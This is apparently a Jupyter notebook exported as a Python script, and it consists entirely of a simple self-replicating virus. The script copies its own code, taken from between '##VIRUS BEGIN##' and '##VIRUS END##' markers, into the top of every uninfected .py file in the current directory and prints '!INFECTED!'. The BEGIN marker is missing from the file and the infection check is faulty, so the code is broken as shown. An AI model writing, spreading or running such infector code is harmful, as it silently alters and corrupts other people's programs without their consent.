#!/usr/bin/env python
# coding: utf-8

# In[1]:



import sys, glob, re


# In[17]:


vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False

for line in lines:
    if (re.search('^##VIRUS BEGIN##', line)) : inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search('^##VIRUS END##', line)) : break
 
progs = glob.glob("*.py")

for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if('##VIRUS BEGIN##' in line):
            infected = True
        break
    if not infected:
        newCode = []
        if ('#!' in pCode[0]) : newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()
        
        print("!INFECTED!")
        
        
        ##VIRUS END##


# In[ ]:





# In[ ]:




